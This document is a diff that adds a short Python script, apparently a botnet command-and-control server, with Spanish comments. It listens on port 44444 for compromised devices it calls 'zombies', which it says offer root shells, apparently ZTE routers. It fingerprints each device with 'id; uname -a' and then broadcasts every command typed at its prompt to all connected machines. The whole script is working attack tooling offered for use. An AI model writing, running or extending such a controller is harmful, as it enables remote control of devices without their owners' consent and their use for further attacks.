@@ -1,0 +1,61 @@
+!/usr/bin/env python3
+import socket
+import threading
+
+zombies = {}
+PORT = 44444      #IP donde esta esuchando el c2.py
+
+def handler(conn, addr):
+    ip = addr[0]
+    zombies[ip] = conn
+    print(f"\n[+] ZOMBIE CONECTADO → {ip} (root shell listo)")
+
+    
+    conn.send(b"id; uname -a; echo; echo 'READY'\n")
+
+    while ip in zombies:
+        try:
+            data = conn.recv(4096)
+            if not data: break
+            salida = data.decode('utf-8', errors='replace')
+            if "READY" in salida:
+                print(f"\n[{ip}] SHELL LISTA – ya puedes meter comandos")
+            else:
+                print(f"[{ip}] {salida.rstrip()}")
+        except:
+            break
+    print(f"[-] ZOMBIE CAÍDO → {ip}")
+    zombies.pop(ip, None)
+    conn.close()
+
+# Listener
+s = socket.socket()
+s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+s.bind(("0.0.0.0", PORT))
+s.listen(100)
+print(f"[*] C2 CORRECTO EN 192.168.1.2:{PORT} – ZTE 100 % ESTABLE")
+
+def accept_loop():
+    while True:
+        conn, addr = s.accept()
+        threading.Thread(target=handler, args=(conn, addr), daemon=True).start()
+
+threading.Thread(target=accept_loop, daemon=True).start()
+
+# Menú y enviar comandos
+while True:
+    print("\n" + "="*60)
+    print(f" ZOMBIES VIVOS → {len(zombies)} → {[ip for ip in zombies]}")
+    print("="*60)
+    try:
+        cmd = input("shell> ").strip()
+        if cmd.lower() in ["exit", "quit"]: break
+        if not cmd: continue
+        for sock in list(zombies.values()):
+            try:
+                sock.send((cmd + "\n").encode())
+            except:
+                pass
+        print(f"[→] Comando enviado: {cmd}")
+    except KeyboardInterrupt:
+        break
